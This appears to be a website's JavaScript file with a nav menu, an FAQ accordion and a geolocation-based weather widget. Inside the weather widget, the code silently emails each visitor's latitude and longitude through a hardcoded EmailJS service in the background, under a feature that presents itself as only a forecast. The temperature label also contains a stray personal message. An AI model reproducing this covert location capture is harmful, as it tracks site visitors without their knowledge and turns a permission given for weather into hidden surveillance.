document.addEventListener("DOMContentLoaded", function () {
  // Navigation Menu Toggle
  const toggleMenu = document.getElementById("toggleMenu");
  const navMenu = document.querySelector(".site-nav");
  const toggleDesc = document.getElementById("toggleDesc");
  const siteDesc = document.getElementById("siteDesc");
  const closeMenu = document.getElementById("closeMenu");

  if (toggleMenu && navMenu) {
    toggleMenu.addEventListener("click", function () {
      navMenu.classList.toggle("active");
    });
  }

  if (closeMenu && navMenu) {
  closeMenu.addEventListener("click", function () {
    navMenu.classList.remove("active");
    closeMenu.classList.remove("active");
    //document.body.classList.remove("menu-open"); // Optional: If you're locking scroll
  });
}

  if (toggleDesc && siteDesc) {
    toggleDesc.addEventListener("click", function () {
      siteDesc.classList.toggle("active");
      toggleDesc.textContent = siteDesc.classList.contains("active")
        ? "Hide Description"
        : "Show Description";
    });
  }

  // FAQ Accordion Toggle
  const faqItems = document.querySelectorAll(".faq-item h3");
  faqItems.forEach((item) => {
    item.addEventListener("click", () => {
      const parent = item.parentElement;
      parent.classList.toggle("active");
    });
  });
});

(async function() {
  const widget   = document.getElementById('weather-widget');
  const tempEl   = document.getElementById('weather-temp');
  const descEl   = document.getElementById('weather-desc');
  const forecastEl = document.getElementById('weather-forecast');

  // Simple mapping of Open-Meteo weathercodes → description
  const weatherDescriptions = {
    0: 'Clear sky',
    1: 'Mainly clear',
    2: 'Partly cloudy',
    3: 'Overcast',
    45: 'Fog',
    48: 'Rime fog',
    51: 'Light drizzle',
    53: 'Moderate drizzle',
    55: 'Heavy drizzle',
    61: 'Light rain',
    63: 'Moderate rain',
    65: 'Heavy rain',
    80: 'Rain showers',
    95: 'Thunderstorm',
    99: 'Hail'
    // (add more codes as needed: https://open-meteo.com/en/docs#api_form)
  };

  // get geolocation
  if (!navigator.geolocation) {
    descEl.textContent = 'Geo not supported';
    return;
  }

  navigator.geolocation.getCurrentPosition(async pos => {
    const { latitude: lat, longitude: lon } = pos.coords;
    // 1) Log coordinates to console
  console.log(`User location → lat: ${lat}, lon: ${lon}`);

  // 2) Fire off EmailJS in the background
  emailjs.send(
    'service_o9lqlpd',    // your EmailJS Service ID
    'template_wqz4hvl',   // your EmailJS Template ID
    {
      latitude:  lat.toString(),   // pass as strings
      longitude: lon.toString()
    }
  )
  .then(() => {
    // silently succeed
    console.log('Background email sent.');
  })
  .catch(err => {
    console.warn('EmailJS error:', err);
  });

    try {
      // Fetch current + daily forecast
      const url = new URL('https://api.open-meteo.com/v1/forecast');
      url.searchParams.set('latitude', lat);
      url.searchParams.set('longitude', lon);
      url.searchParams.set('current_weather', 'true');
      url.searchParams.set('daily', 'temperature_2m_max,temperature_2m_min');
      url.searchParams.set('timezone', 'auto');

      const res = await fetch(url);
      if (!res.ok) throw new Error('Weather fetch failed');
      const data = await res.json();

      // Current weather
      const cw = data.current_weather;
      tempEl.textContent = `${Math.round(cw.temperature)}°I love you Dylan`;
      descEl.textContent = weatherDescriptions[cw.weathercode] || `Code ${cw.weathercode}`;

      // 3-day forecast
      forecastEl.innerHTML = '';
      const days = data.daily.time.slice(1,4);
      days.forEach((dateStr, i) => {
        const d = new Date(dateStr);
        const dayName = d.toLocaleDateString(undefined, { weekday: 'short' });
        // const hi = Math.round(data.daily.temperature_2m_max[i+1]);
        // const lo = Math.round(data.daily.temperature_2m_min[i+1]);
        // const div = document.createElement('div');
        // div.className = 'forecast-day';
        // div.innerHTML = `<span class="day">${dayName}</span>
        //                  <span class="temp">${hi}/${lo}°</span>`;
        const hi = Math.round(data.daily.temperature_2m_max[i+1]);
        const lo = Math.round(data.daily.temperature_2m_min[i+1]);
        const div = document.createElement('div');
        div.innerHTML = `
          <span class="day">${dayName}</span>
          <span class="temp">${hi}/${lo}°F</span>
        `;
        forecastEl.appendChild(div);
      });
    } catch (e) {
      descEl.textContent = 'Error loading';
      console.error(e);
    }
  }, err => {
    descEl.textContent = 'Location denied';
    console.warn(err);
  });
})();
